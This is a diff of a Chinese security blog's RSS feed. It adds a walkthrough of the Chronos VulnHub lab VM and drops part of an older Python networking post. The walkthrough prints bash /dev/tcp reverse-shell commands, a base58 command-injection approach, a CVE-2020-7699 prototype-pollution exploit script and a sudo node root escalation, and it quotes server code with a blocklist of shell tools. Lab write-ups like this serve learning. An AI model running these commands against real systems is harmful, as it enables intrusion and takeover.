@@ -10,14 +10,257 @@
         </author>
         <description>一个妄想全栈web小废物</description>
         <language>zh-CN</language>
-        <pubDate>Fri, 14 Jul 2023 00:00:00 +0800</pubDate>
-        <lastBuildDate>Fri, 14 Jul 2023 00:00:00 +0800</lastBuildDate>
+        <pubDate>Sat, 15 Jul 2023 00:00:00 +0800</pubDate>
+        <lastBuildDate>Sat, 15 Jul 2023 00:00:00 +0800</lastBuildDate>
         <category term="Clown" />
         <category term="Web" />
         <category term="Pwn" />
         <category term="CTF" />
         <category term="AWD" />
         <category term="ACM" />
+        <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2023/07/15/Chronos%E7%9A%84%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</guid>
+            <title>Chronos的靶机打靶记录</title>
+            <link>https://blog.xcu.icu/2023/07/15/Chronos%E7%9A%84%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</link>
+            <category term="Vulnhub" scheme="https://blog.xcu.icu/categories/Vulnhub/" />
+            <category term="Vulnhub" scheme="https://blog.xcu.icu/tags/Vulnhub/" />
+            <pubDate>Sat, 15 Jul 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这不刚写完nodejs的相关利用，这里也是马上找到了一个js的靶机来学习一下，本次的的目标&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2hyb25vcy0xLDczNS8=&#34;&gt;Chronos: 1 ~ VulnHub&lt;/span&gt;，本来想水一下描述，但是发现作者就给了一个中等难度，那我就自己做下来的过程给一个描述。&lt;/p&gt;
+&lt;h2 id=&#34;描述&#34;&gt;&lt;a href=&#34;#描述&#34; class=&#34;headerlink&#34; title=&#34;描述&#34;&gt;&lt;/a&gt;描述&lt;/h2&gt;&lt;p&gt;难度：中级&lt;/p&gt;
+&lt;p&gt;设计的任务：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;主机发现，端口扫描&lt;/li&gt;
+&lt;li&gt;WEB应用攻击&lt;/li&gt;
+&lt;li&gt;命令注入&lt;/li&gt;
+&lt;li&gt;数据编解码&lt;/li&gt;
+&lt;li&gt;框架漏洞利用&lt;/li&gt;
+&lt;li&gt;代码审计&lt;/li&gt;
+&lt;li&gt;本地提权&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;虚拟机：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;格式： 虚拟机 （Virtualbox OVA）&lt;/li&gt;
+&lt;li&gt;操作系统： Linux.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;联网：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DHCP 服务：已启用&lt;/li&gt;
+&lt;li&gt;IP 地址自动分配&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;攻击过程&#34;&gt;&lt;a href=&#34;#攻击过程&#34; class=&#34;headerlink&#34; title=&#34;攻击过程&#34;&gt;&lt;/a&gt;攻击过程&lt;/h2&gt;&lt;h3 id=&#34;信息收集&#34;&gt;&lt;a href=&#34;#信息收集&#34; class=&#34;headerlink&#34; title=&#34;信息收集&#34;&gt;&lt;/a&gt;信息收集&lt;/h3&gt;&lt;p&gt;这里靶机和我的kali都是通过桥接连接到局域网中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715073929840.png&#34; alt=&#34;image-20230715073929840&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里我kali的ip是192.168.13.249,这里用nmap扫描13全段&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715074108860.png&#34; alt=&#34;image-20230715074108860&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里给其分配的ip是192.168.13.96,接着对端口进行一个协议的发现&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715074315887.png&#34; alt=&#34;image-20230715074315887&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看到22端口是一个openssh服务，版本是7.6，80是一个Apache的web服务版本是2.4.29，8000端口是一个nodejs的web服务&lt;/p&gt;
+&lt;p&gt;这里还是去通过浏览器访问80端口和8000端口&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075134888.png&#34; alt=&#34;image-20230715075134888&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075157760.png&#34; alt=&#34;image-20230715075157760&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里两个端口都发现了类似的js源码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075334703.png&#34; alt=&#34;image-20230715075334703&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715075346630.png&#34; alt=&#34;image-20230715075346630&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里将这部分js代码复制到文本中分析，这里文本信息很杂乱，而且有编码，这里使用在线工具对其进行整理&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715080007487.png&#34; alt=&#34;image-20230715080007487&#34;&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;JavaScript&#34;&gt;var _0x5bdf = [
+    &amp;#39;150447srWefj&amp;#39;,
+    &amp;#39;70lwLrol&amp;#39;,
+    &amp;#39;1658165LmcNig&amp;#39;,
+    &amp;#39;open&amp;#39;,
+    &amp;#39;1260881JUqdKM&amp;#39;,
+    &amp;#39;10737CrnEEe&amp;#39;,
+    &amp;#39;2SjTdWC&amp;#39;,
+    &amp;#39;readyState&amp;#39;,
+    &amp;#39;responseText&amp;#39;,
+    &amp;#39;1278676qXleJg&amp;#39;,
+    &amp;#39;797116soVTES&amp;#39;,
+    &amp;#39;onreadystatechange&amp;#39;,
+    &amp;#39;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&amp;#39;,
+    &amp;#39;User-Agent&amp;#39;,
+    &amp;#39;status&amp;#39;,
+    &amp;#39;1DYOODT&amp;#39;,
+    &amp;#39;400909Mbbcfr&amp;#39;,
+    &amp;#39;Chronos&amp;#39;,
+    &amp;#39;2QRBPWS&amp;#39;,
+    &amp;#39;getElementById&amp;#39;,
+    &amp;#39;innerHTML&amp;#39;,
+    &amp;#39;date&amp;#39;
+];
+(function (_0x506b95, _0x817e36) &amp;#123;
+    var _0x244260 = _0x432d;
+    while (!![]) &amp;#123;
+        try &amp;#123;
+            var _0x35824b = -parseInt(_0x244260(126)) * parseInt(_0x244260(144)) + parseInt(_0x244260(142)) + parseInt(_0x244260(127)) * parseInt(_0x244260(131)) + -parseInt(_0x244260(135)) + -parseInt(_0x244260(130)) * parseInt(_0x244260(141)) + -parseInt(_0x244260(136)) + parseInt(_0x244260(128)) * parseInt(_0x244260(132));
+            if (_0x35824b === _0x817e36)
+                break;
+            else
+                _0x506b95[&amp;#39;push&amp;#39;](_0x506b95[&amp;#39;shift&amp;#39;]());
+        &amp;#125; catch (_0x3fb1dc) &amp;#123;
+            _0x506b95[&amp;#39;push&amp;#39;](_0x506b95[&amp;#39;shift&amp;#39;]());
+        &amp;#125;
+    &amp;#125;
+&amp;#125;(_0x5bdf, 831262));
+function _0x432d(_0x16bd66, _0x33ffa9) &amp;#123;
+    return _0x432d = function (_0x5bdf82, _0x432dc8) &amp;#123;
+        _0x5bdf82 = _0x5bdf82 - 126;
+        var _0x4da6e8 = _0x5bdf[_0x5bdf82];
+        return _0x4da6e8;
+    &amp;#125;, _0x432d(_0x16bd66, _0x33ffa9);
+&amp;#125;
+function loadDoc() &amp;#123;
+    var _0x17df92 = _0x432d, _0x1cff55 = _0x17df92(143), _0x2beb35 = new XMLHttpRequest();
+    _0x2beb35[_0x17df92(137)] = function () &amp;#123;
+        var _0x146f5d = _0x17df92;
+        this[_0x146f5d(133)] == 4 &amp;amp;&amp;amp; this[_0x146f5d(140)] == 200 &amp;amp;&amp;amp; (document[_0x146f5d(145)](_0x146f5d(147))[_0x146f5d(146)] = this[_0x146f5d(134)]);
+    &amp;#125;, _0x2beb35[_0x17df92(129)](&amp;#39;GET&amp;#39;, _0x17df92(138), !![]), _0x2beb35[&amp;#39;setRequestHeader&amp;#39;](_0x17df92(139), _0x1cff55), _0x2beb35[&amp;#39;send&amp;#39;]();
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里有个url，先对参数进行解码，发现是base58加密&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715082739759.png&#34; alt=&#34;image-20230715082739759&#34;&gt;&lt;/p&gt;
+&lt;p&gt;现在不知道有什么用，这里去访问一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715080204315.png&#34; alt=&#34;image-20230715080204315&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里直接去访问是没有权限的，这里我开始以为是伪造身份信息之类，最后我又访问了一次不带参数的8000端口发现了奇怪的地方&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081112507.png&#34; alt=&#34;image-20230715081112507&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里直接发送了http:&amp;#x2F;&amp;#x2F;chronos.local:8000&amp;#x2F;date?format&amp;#x3D;4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL这个请求，但是他的页面又是基于ip的，这个域名没法解析，于是这里我更改了本地的host文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081512401.png&#34; alt=&#34;image-20230715081512401&#34;&gt;&lt;/p&gt;
+&lt;p&gt;更改完成的效果&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081553334.png&#34; alt=&#34;image-20230715081553334&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这是我再去访问页面&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081819105.png&#34; alt=&#34;image-20230715081819105&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里再去尝试访问http:&amp;#x2F;&amp;#x2F;chronos.local:8000&amp;#x2F;date?format&amp;#x3D;4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL这个请求就是能成功的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081712016.png&#34; alt=&#34;image-20230715081712016&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715081722800.png&#34; alt=&#34;image-20230715081722800&#34;&gt;&lt;/p&gt;
+&lt;p&gt;两个页面都多来一条当前的时间&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715082339580.png&#34; alt=&#34;image-20230715082339580&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里可以看见，这个时间实际上是get的这个请求得到的，这里使用burp抓包方便测试，这个输出的结果格式和上面解码拿到的相同，这里更改了一下传入的信息&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715083121633.png&#34; alt=&#34;image-20230715083121633&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里通过burp重放&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715083148006.png&#34; alt=&#34;image-20230715083148006&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里是能根据我的参数进行改变的&lt;/p&gt;
+&lt;h3 id=&#34;命令注入反弹shell&#34;&gt;&lt;a href=&#34;#命令注入反弹shell&#34; class=&#34;headerlink&#34; title=&#34;命令注入反弹shell&#34;&gt;&lt;/a&gt;命令注入反弹shell&lt;/h3&gt;&lt;p&gt;很显然这里应该是一个date命令，这里应该是可以进行命令注入&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085117363.png&#34; alt=&#34;image-20230715085117363&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里这样尝试一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085140947.png&#34; alt=&#34;image-20230715085140947&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现是能够成功执行命令的，这里反弹一个shell&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.13.249/2333 0&amp;gt;&amp;amp;1&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085421912.png&#34; alt=&#34;image-20230715085421912&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里就可以成功拿到一个shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715085501970.png&#34; alt=&#34;image-20230715085501970&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;进一步信息收集&#34;&gt;&lt;a href=&#34;#进一步信息收集&#34; class=&#34;headerlink&#34; title=&#34;进一步信息收集&#34;&gt;&lt;/a&gt;进一步信息收集&lt;/h3&gt;&lt;p&gt;接下来就是去这台机器上面寻找相关信息，首先我到根目录就看到一个lost+found文件，这里应该是一个删除的文件，这里想要打开却权限不够&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715090922436.png&#34; alt=&#34;image-20230715090922436&#34;&gt;&lt;/p&gt;
+&lt;p&gt;所以这里我又去查看了一下&amp;#x2F;etc&amp;#x2F;passwd文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715091218132.png&#34; alt=&#34;image-20230715091218132&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看见有两个可以执行shell的用户，这里去home目录看一下发现有一个imera目录，但是没权限打开其中的文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715091623349.png&#34; alt=&#34;image-20230715091623349&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里就需要提权，当时内核，sudo，suid都没有找到能提权的方式，这里最后是在网站根目录找到了能进一步利用的地方，这里可以先看到package,json文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715093606041.png&#34; alt=&#34;image-20230715093606041&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里声明了环境用到的框架和库，这里可以看到使用了express框架，这里看一下app.js&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;const express = require(&amp;#39;express&amp;#39;);
+const &amp;#123; exec &amp;#125; = require(&amp;quot;child_process&amp;quot;);
+const bs58 = require(&amp;#39;bs58&amp;#39;);
+const app = express();
+const port = 8000;
+const cors = require(&amp;#39;cors&amp;#39;);
+app.use(cors());
+app.get(&amp;#39;/&amp;#39;, (req,res) =&amp;gt;&amp;#123;
+    res.sendFile(&amp;quot;/var/www/html/index.html&amp;quot;);
+&amp;#125;);
+app.get(&amp;#39;/date&amp;#39;, (req, res) =&amp;gt; &amp;#123;
+    var agent = req.headers[&amp;#39;user-agent&amp;#39;];
+    var cmd = &amp;#39;date &amp;#39;;
+    const format = req.query.format;
+    const bytes = bs58.decode(format);
+    var decoded = bytes.toString();
+    var concat = cmd.concat(decoded);
+    if (agent === &amp;#39;Chronos&amp;#39;) &amp;#123;
+        if (concat.includes(&amp;#39;id&amp;#39;) || concat.includes(&amp;#39;whoami&amp;#39;) || concat.includes(&amp;#39;python&amp;#39;) || concat.includes(&amp;#39;nc&amp;#39;) || concat.includes(&amp;#39;bash&amp;#39;) || concat.includes(&amp;#39;php&amp;#39;) || concat.includes(&amp;#39;which&amp;#39;) || concat.includes(&amp;#39;socat&amp;#39;)) &amp;#123;
+            res.send(&amp;quot;Something went wrong&amp;quot;);
+        &amp;#125;
+        exec(concat, (error, stdout, stderr) =&amp;gt; &amp;#123;
+            if (error) &amp;#123;
+                console.log(`error: $&amp;#123;error.message&amp;#125;`);
+                return;
+            &amp;#125;
+            if (stderr) &amp;#123;
+                console.log(`stderr: $&amp;#123;stderr&amp;#125;`);
+                return;
+            &amp;#125;
+            res.send(stdout);
+        &amp;#125;);
+    &amp;#125;
+    else&amp;#123;
+        res.send(&amp;quot;Permission Denied&amp;quot;);
+    &amp;#125;
+&amp;#125;)
+app.listen(port,() =&amp;gt; &amp;#123;
+    console.log(`Server running at $&amp;#123;port&amp;#125;`);
+&amp;#125;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个就是刚刚访问的那个服务的代码，回到上级目录，这里发现了另一个目录&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715102046937.png&#34; alt=&#34;image-20230715102046937&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里看到chronos-v2是隶属root的，这里就猜测这里可能是有另一个web应用这里，这里也是进去看一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715102811833.png&#34; alt=&#34;image-20230715102811833&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里又发现一个package.json文件，这里打开看一下这个文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715102923282.png&#34; alt=&#34;image-20230715102923282&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里有一个express-fileupload，这里存在原型链污染，这里先提一下，详细的后面说，接着打开server.js文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;const express = require(&amp;#39;express&amp;#39;);
+const fileupload = require(&amp;quot;express-fileupload&amp;quot;);
+const http = require(&amp;#39;http&amp;#39;)
+
+const app = express();
+
+app.use(fileupload(&amp;#123; parseNested: true &amp;#125;));
+
+app.set(&amp;#39;view engine&amp;#39;, &amp;#39;ejs&amp;#39;);
+app.set(&amp;#39;views&amp;#39;, &amp;quot;/opt/chronos-v2/frontend/pages&amp;quot;);
+
+app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; &amp;#123;
+   res.render(&amp;#39;index&amp;#39;)
+&amp;#125;);
+
+const server = http.Server(app);
+const addr = &amp;quot;127.0.0.1&amp;quot;
+const port = 8080;
+server.listen(port, addr, () =&amp;gt; &amp;#123;
+   console.log(&amp;#39;Server listening on &amp;#39; + addr + &amp;#39; port &amp;#39; + port);
+&amp;#125;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里可以看到，这个8080只开放给127.0.0.1，这里可以看到parseNested配置选项设置为true，前面的版本是1.1.7，条件都满足了NodeJS模块代码注入&lt;/p&gt;
+&lt;h3 id=&#34;漏洞利用&#34;&gt;&lt;a href=&#34;#漏洞利用&#34; class=&#34;headerlink&#34; title=&#34;漏洞利用&#34;&gt;&lt;/a&gt;漏洞利用&lt;/h3&gt;&lt;p&gt;漏洞编号CVE-2020-7699&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
+
+url = &amp;#39;http://127.0.0.1:8080&amp;#39;
+cmd = &amp;#39;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.13.249/2444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#39;
+poc = &amp;#123;
+    &amp;#39;__proto__.outputFunctionName&amp;#39;: (None,f&amp;quot;x;process.mainModule.require(&amp;#39;child_process&amp;#39;).exec(&amp;#39;&amp;#123;cmd&amp;#125;&amp;#39;);x&amp;quot;
+    )
+&amp;#125;
+
+requests.post(url, files=poc)
+requests.get(url)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里在kali开启http服务将文件传输进靶机中&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115021639.png&#34; alt=&#34;image-20230715115021639&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115034887.png&#34; alt=&#34;image-20230715115034887&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里监听2444端口后运行脚本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115653458.png&#34; alt=&#34;image-20230715115653458&#34;&gt;&lt;/p&gt;
+&lt;p&gt;成功拿到shell，这里可以看到当前的用户是imera，是不是就想起了开始为什么要提权？当即去到imera目录查看那个user.txt文件&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715115924920.png&#34; alt=&#34;image-20230715115924920&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里拿到的好像又是一个编码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120043402.png&#34; alt=&#34;image-20230715120043402&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里算是拿到了第一个flag，但是这并没结束，我们并没有拿到root权限&lt;/p&gt;
+&lt;h3 id=&#34;二次提权&#34;&gt;&lt;a href=&#34;#二次提权&#34; class=&#34;headerlink&#34; title=&#34;二次提权&#34;&gt;&lt;/a&gt;二次提权&lt;/h3&gt;&lt;p&gt;还是刚刚提到的三种提权方式，内核，suid，sudo三种方式，分别查看后，发现这里sudo有配置漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120515989.png&#34; alt=&#34;image-20230715120515989&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里使用node来进行提权&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;perl&#34;&gt;sudo node -e &amp;#39;child_process.spawn(&amp;quot;/bin/bash&amp;quot;,&amp;#123;stdio:[0,1,2]&amp;#125;)&amp;#39;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120756692.png&#34; alt=&#34;image-20230715120756692&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里提权成功，这里还是到家目录，这里还有一个flag，也能拿到root的权限&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230715120835250.png&#34; alt=&#34;image-20230715120835250&#34;&gt;&lt;/p&gt;
+&lt;p&gt;到这里就算是结束了，总的来说收货很多，但是对于nodejs的利用好像不是特别明显哈，也是去&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zdXl1bWVuLmdpdGh1Yi5pby8yMDIyLzA0LzE2LzIwMjItMDQtMTYtQ1ZFLTIwMjAtNzY5OS8=&#34;&gt;CVE-2020-7699复现 · SUYUMEN&lt;/span&gt;这位师傅的博客去学习了一下&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://blog.xcu.icu/2023/07/14/easy_cloudantivirus%E9%9D%B6%E6%9C%BA%E6%94%BB%E5%87%BB%E8%AE%B0%E5%BD%95/</guid>
             <title>记一次easy_cloudantivirus打靶记录</title>
@@ -8832,396 +9075,6 @@ if __name__ == &#39;__main__&#39;:
     for i in range(30):
         threading.Thread(target=read, args=(session,)).start()
     event.wait()
-&lt;/code&gt;&lt;/pre&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2023/02/01/Python%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/</guid>
-            <title>Python网络化编程</title>
-            <link>https://blog.xcu.icu/2023/02/01/Python%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/</link>
-            <category term="Python" scheme="https://blog.xcu.icu/categories/Python/" />
-            <category term="Python" scheme="https://blog.xcu.icu/tags/Python/" />
-            <pubDate>Wed, 01 Feb 2023 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h2 id=&#34;网络架构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络架构&#34;&gt;#&lt;/a&gt; 网络架构&lt;/h2&gt;
-&lt;h3 id=&#34;网络体系结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络体系结构&#34;&gt;#&lt;/a&gt; 网络体系结构&lt;/h3&gt;
-&lt;p&gt;1.OSI 协议是由 ISO (国际标准化组织) 制定的，用于提供给开发者一个必须的、通用的概念以便开发完善、可以用来解释连接不同系统的框架。OSI 协议将网络体系结构划分为 7 层：应用层、表示层、会话层、传输层、网络层、数据链路层、物理层。&lt;br /&gt;
-2.TCP/IP (Transmission Control Protocol/Internet Protocol，传输控制协议 / 网际协议) 体系结构是指能够在多个不同网络间实现的协议簇。TCP/IP 传输协议包含 4 层体系结构，应用层、传输层、网络层和网络接口层。&lt;/p&gt;
-&lt;p&gt;主要分层级如下图所示：&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230131173017627.png&#34; alt=&#34;image-20230131173017627&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;分成设计的好处：&lt;/p&gt;
-&lt;p&gt;各层之间可以独立设计和实现，只要保证相邻层之间的调用规范和接口不变，便可以非常方便的灵活的改变各层内部实现方式，以进行优化和完成需求&lt;/p&gt;
-&lt;h3 id=&#34;应用层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用层&#34;&gt;#&lt;/a&gt; 应用层&lt;/h3&gt;
-&lt;p&gt;应用层定义了运行在不同系统上的应用程序如何相互传递报文&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;DNS: 域名系统 (Domain Name System)，用来实现域名与 IP 地址的转换，运行在 UDP 之上，默认使用 53 端口:&lt;/li&gt;
-&lt;li&gt;FTP: 文件传输协议 (File Transfer Protocol)，可以通过网络在不同平台之间实现文件的传输，是一种基于 TCP 的明文传输协议，默认工作在 21 端口；&lt;/li&gt;
-&lt;li&gt;HTTP: 超文本传输协议 (HyperText Transfer Protocol)，运行于 TCP 之上，默认端口为 80:&lt;/li&gt;
-&lt;li&gt;SMTP: 简单邮件传输协议 (Simple Mail Transfer Protoco)，建立在 TCP 的基础上，使用明文传递邮件和发送命令，默认使用 25 端口。&lt;/li&gt;
-&lt;li&gt;TELNET: 远程登陆协议，运行于 TCP 之上，默认使用 23 端口。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;传输层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传输层&#34;&gt;#&lt;/a&gt; 传输层&lt;/h3&gt;
-&lt;p&gt;主要负责向两个主机中进程之间的通信提供服务。&lt;/p&gt;
-&lt;p&gt;在网络中，每台主机系统都拥有一个唯一的 IP 地址，发送方根据接收方的 IP 地址，将消息发送到接收方。每个程序的运行在主机系统中都有唯一的端口号。只需要通过 IP 进行寻址确定的目标主机，再根据目标系统的端口号，就能够正确的将消息进行传递。&lt;/p&gt;
-&lt;p&gt;网络层是根据网络地址将源结点发出的数据包传送到目的结点，而传输层则负责将数据可靠地传送到目标系统对应的端口。&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;TCP: 为两台计算机之间提供面向连接、可靠的字节流服务。一台计算机发出的字节流无差错地发往网络上的其他计算机，由于其可靠的传输方式，故传输速度较慢。&lt;/li&gt;
-&lt;li&gt;UDP: 是一个简单的面向数据报的传输层协议。提供的是非面向连接的、不可靠的数据流传输。UDP 在传输数据报前不用在客户和服务器之间建立一个连接，且没有超时重发等机制，故传输速度很快。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;三次握手协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三次握手协议&#34;&gt;#&lt;/a&gt; 三次握手协议&lt;/h4&gt;
